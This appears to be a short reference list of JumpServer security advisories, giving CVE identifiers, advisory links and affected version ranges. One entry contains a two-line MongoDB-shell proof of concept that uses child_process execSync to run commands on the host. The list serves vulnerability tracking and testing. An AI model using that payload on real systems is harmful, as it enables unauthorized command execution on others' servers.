Ref:
- https://github.com/jumpserver/jumpserver/security


### [CVE-2023-28110] Command Injection for Kubernets Connection
https://github.com/jumpserver/jumpserver/security/advisories/GHSA-6x5p-jm59-jh29

Affected versions
```
<2.28.7
```

### [CVE-2023-43651] RCE on the host system via MongoDB shell
https://github.com/jumpserver/jumpserver/security/advisories/GHSA-4r5x-x283-wm96
```
admin> const { execSync } = require("child_process")
admin> console.log(execSync("id; hostname;").toString())
```
Affected versions
```
v2.0.0-v2.28.19,
v3.0.0-v3.7.0
```

### [CVE-2023-42819] Playbook file uploads cause directory crossing and remote command execution.
The affected versions:
```
v3.0.0 - v3.6.4
```
https://github.com/jumpserver/jumpserver/security/advisories/GHSA-ghg2-2whp-6m33


### [CVE-2023-42442] Session replays download without authentication
https://github.com/jumpserver/jumpserver/security/advisories/GHSA-633x-3f4f-v9rw


Affected versions
```
v3.0.0 - v3.6.3
```
